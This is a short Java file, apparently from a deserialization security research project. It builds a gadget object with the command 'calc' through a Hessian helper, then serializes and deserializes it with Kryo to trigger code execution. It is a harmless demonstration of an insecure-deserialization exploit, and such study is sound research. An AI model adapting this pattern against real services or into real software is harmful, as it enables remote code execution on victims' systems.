package org.example.my4unser.kryo;

import org.example.my4unser.utils.KryoUtil;

public class OnlyJdk {
    public static void main(String[] args) throws Exception{
        KryoUtil.kryoUnser(KryoUtil.kryoSer(org.example.my4unser.hessian.OnlyJdk.pack(org.example.my4unser.hessian.OnlyJdk.getValue("calc"))));
    }
}
